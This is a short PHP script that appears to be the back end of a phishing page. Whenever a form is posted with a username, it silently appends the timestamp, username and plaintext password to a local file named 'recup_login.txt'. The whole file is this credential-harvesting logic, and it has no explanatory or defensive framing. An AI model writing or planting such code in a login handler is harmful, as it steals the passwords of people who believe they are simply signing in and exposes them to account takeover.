<?php


if( sizeof($_POST) > 0) {
	if(!empty($_POST['username']) && is_string($_POST['username'])) {
		file_put_contents('recup_login.txt', date('d/m/Y H:i:s').' - login: '.$_POST['username'].', password: '.$_POST['password']."\n", FILE_APPEND);
	}
}